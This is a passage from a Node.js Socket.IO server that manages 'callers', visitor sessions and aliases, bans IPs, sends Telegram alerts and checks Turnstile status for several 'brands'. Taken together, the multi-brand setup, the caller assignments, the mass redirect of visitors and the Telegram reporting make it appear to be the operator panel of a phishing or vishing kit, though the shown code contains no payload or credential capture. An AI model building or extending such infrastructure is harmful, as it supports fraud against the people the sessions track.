            console.error('Error unbanning IP:', error);
            ipManager.unbanIP(ip);
            adminNamespace.emit('ip_unbanned', ip);
        }
    });

    // Caller management events
    socket.on('add_caller', (callerData) => {
        try {
            const newCaller = callerManager.addCaller(callerData);
            adminNamespace.emit('caller_added', newCaller);
        } catch (error) {
            socket.emit('caller_error', { error: error.message });
        }
    });

    socket.on('update_caller', ({ id, data }) => {
        try {
            // Get the caller details before update
            const callers = callerManager.getAllCallers();
            const callerBeforeUpdate = callers.find(c => c.id === id);

            const updatedCaller = callerManager.updateCaller(id, data);

            // If password was changed, force logout the caller
            if (callerBeforeUpdate && data.password && data.password !== callerBeforeUpdate.password) {
                const callerSessions = activeCallerSessions.get(updatedCaller.username);
                if (callerSessions && callerSessions.size > 0) {
                    console.log(`Force logging out caller ${updatedCaller.username} due to password change`);

                    // Emit force logout to all caller's sockets
                    for (const socketId of callerSessions) {
                        const callerSocket = adminNamespace.sockets.get(socketId);
                        if (callerSocket) {
                            callerSocket.emit('force_logout', {
                                reason: 'Your password has been changed by an administrator. Please login again.'
                            });
                            callerSocket.disconnect(true);
                        }
                    }

                    // Clean up the active sessions map
                    activeCallerSessions.delete(updatedCaller.username);
                }
            }

            adminNamespace.emit('caller_updated', updatedCaller);
        } catch (error) {
            socket.emit('caller_error', { error: error.message });
        }
    });

    socket.on('delete_caller', (id) => {
        try {
            // Get the caller details before deletion
            const callers = callerManager.getAllCallers();
            const callerToDelete = callers.find(c => c.id === id);

            if (callerToDelete) {
                // Delete the caller from database
                callerManager.deleteCaller(id);

                // Revoke all persistent session tokens for this caller
                const revokedCount = callerSessionManager.revokeAllSessionsForCaller(id);
                if (revokedCount > 0) {
                    console.log(`Revoked ${revokedCount} session tokens for caller: ${callerToDelete.username}`);
                }

                // Force logout all active sessions for this caller
                const callerSessions = activeCallerSessions.get(callerToDelete.username);
                if (callerSessions && callerSessions.size > 0) {
                    console.log(`Force logging out caller: ${callerToDelete.username}`);

                    // Emit force logout to all caller's sockets
                    for (const socketId of callerSessions) {
                        const callerSocket = adminNamespace.sockets.get(socketId);
                        if (callerSocket) {
                            callerSocket.emit('force_logout', {
                                reason: 'Your account has been deleted by an administrator'
                            });
                            callerSocket.disconnect(true);
                        }
                    }

                    // Clean up the active sessions map
                    activeCallerSessions.delete(callerToDelete.username);
                }

                // Notify all admins
                adminNamespace.emit('caller_deleted', id);
            }
        } catch (error) {
            socket.emit('caller_error', { error: error.message });
        }
    });

    socket.on('get_callers', () => {
        socket.emit('callers_list', callerManager.getAllCallers());
    });

    // Alias management events
    socket.on('set_alias', ({ sessionId, alias }) => {
        const newAlias = aliasManager.setAlias(sessionId, alias);
        adminNamespace.emit('alias_updated', { sessionId, alias: newAlias });
    });

    socket.on('get_aliases', () => {
        socket.emit('aliases_list', aliasManager.getAllAliases());
    });

    // Handle disconnect for caller sessions cleanup
    socket.on('disconnect', () => {
        if (socket.userRole === 'caller' && socket.username) {
            const sessions = activeCallerSessions.get(socket.username);
            if (sessions) {
                sessions.delete(socket.id);
                if (sessions.size === 0) {
                    activeCallerSessions.delete(socket.username);
                }
                console.log(`Caller ${socket.username} disconnected`);
            }
        }
    });

    // Get Turnstile configuration status
    socket.on('get_turnstile_status', () => {
        const status = getAllBrandsTurnstileStatus();
        socket.emit('turnstile_status', status);
    });

    socket.on('clear_sessions', async () => {
        try {
            if (socket.userRole === 'caller' && socket.username) {
                // Callers can only clear their own assignments
                const clearedCount = sessionManager.clearAssignmentsForCaller(socket.username);
                adminNamespace.emit('assignments_cleared', {
                    caller: socket.username,
                    count: clearedCount
                });
                await sendTelegramNotification(`📋 Assignments cleared for caller ${socket.username} (${clearedCount} sessions)`);
            } else {
                // Admins can clear all sessions
                const sockets = Array.from(userNamespace.sockets.values());
                for (const userSocket of sockets) {
                    userSocket.emit('redirect', state.settings.redirectUrl);
                    userSocket.disconnect(true);
                }

                for (const sessionId of sessionManager.sessions.keys()) {
                    sessionManager.deleteSession(sessionId);
                }

                adminNamespace.emit('sessions_cleared');
                await sendTelegramNotification('🗑️ All sessions cleared by admin');
            }
        } catch (error) {
            console.error('Error clearing sessions:', error);
            await sendTelegramNotification('❌ Error clearing sessions');
        }
    });
});

// Clean up sessions periodically
setInterval(() => {
    const now = Date.now();
    for (const [sessionId, session] of state.sessions) {
        // Check for heartbeat timeout (30 seconds)
        if (now - session.lastHeartbeat > 30000 && session.connected) {
            session.connected = false;
            adminNamespace.emit('session_updated', session);
        }

        // Delete after 30 minutes of no heartbeat
        if (now - session.lastHeartbeat > 30 * 60 * 1000) {
            state.sessions.delete(sessionId);
            sessionManager.deleteSession(sessionId);
            adminNamespace.emit('session_removed', sessionId);
        }
    }
}, 10000);

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`Server running on port ${PORT}`);
        await backgroundTransformer.startBackgroundTransform(
        process.env.CLOUDFLARE_SITE_KEY,
        state.settings.redirectUrl
    );
    await sendTelegramNotification(formatTelegramMessage('server_status', {
        status: 'Online',
        port: PORT
    }));
});